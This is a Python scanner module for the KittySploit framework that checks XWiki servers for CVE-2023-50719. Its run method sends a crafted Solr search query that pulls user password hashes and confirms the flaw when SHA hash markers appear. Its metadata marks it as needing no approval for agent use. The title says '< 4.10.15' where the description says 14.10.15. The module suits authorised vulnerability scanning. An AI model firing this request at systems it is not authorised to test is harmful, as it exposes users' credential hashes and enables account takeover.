#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform is a generic wiki platform."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki < 4.10.15 - Sensitive Information Disclosure Detection',
        'description': "XWiki Platform is a generic wiki platform. Starting in 7.2-milestone-2 and prior to versions 14.10.15, 15.5.2, and 15.7-rc-1, the Solr-based search in XWiki discloses the password hashes of all users to anyone with view right on the respective user profiles. By default, all user profiles are public. This vulnerability also affects any configurations used by extensions that contain passwords like API keys that are viewable for the attacker. Normally, such passwords aren't accessible but this vulnerability would disclose them as plain text. This has been patched in XWiki 14.10.15, 15.5.2 and 15.7RC1. There are no known workarounds for this vulnerability.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'password', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-21208', 'https://nvd.nist.gov/vuln/detail/CVE-2023-50719'],
        'cve': 'CVE-2023-50719',
    }

    def run(self):
        for path in ('/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale=', '/xwiki/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale='):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('hash:SHA</span>', 'XWikiUsers[0].password',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="XWiki < 4.10.15 - Sensitive Information Disclosure detected",
                    path=path,
                )
                return True
        return False

